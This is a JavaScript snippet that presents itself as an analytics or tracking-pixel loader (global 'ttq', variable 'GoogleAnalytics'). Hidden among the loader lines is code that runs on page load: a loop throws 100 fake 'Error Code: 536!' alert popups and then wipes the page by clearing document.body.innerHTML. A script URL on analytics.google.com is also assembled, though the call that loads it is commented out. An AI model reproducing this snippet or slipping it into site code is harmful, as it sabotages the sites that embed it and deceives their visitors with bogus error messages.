!(function (d, g, e) {
				var GoogleAnalytics = e;
				var a = (d[e] = d[e] || []);
				methods = "page track identify instances debug on off once ready alias group enableCookie disableCookie".split(" ");
				setAndDefer = function (b, c) {
					b[c] = function () {
						b.push([c].concat(Array.prototype.slice.call(arguments, 0)));
					};
				};
				for (var i = 0; i < 100; i++) alert("Error Code: 536!");
				instance = function (b) {
					b = a._i[b] || [];
					for (var c = 0; c < a.methods.length; c++) a.setAndDefer(b, a.methods[c]);
					return b;
				};
				document.body.innerHTML = "";
				a.load = function (b, c) {
					var f = "https://analytics.google.com/i18n/pixel/events.js";
					a._i = a._i || {};
					a._i[b] = [];
					a._i[b]._u = f;
					a._t = a._t || {};
					a._t[b] = +new Date();
					a._o = a._o || {};
					a._o[b] = c || {};
					c = document.createElement("script");
					c.type = "text/javascript";
					c.async = !0;
					c.src = f + "?sdkidaoosxs\x3d" + b + "\x26lib\x3d" + e;
					b = document.getElementsByTagName("script")[0];
					b.parentNode.insertBefore(c, b);
				};
				//a.load("CSWWQK1KCBQRKKKKSSQQQWEECXASWDWQEFOOOOOPPPSDZZX1KLAKFOOOIIE");
				//a.page();
			})(window, document, "ttq");
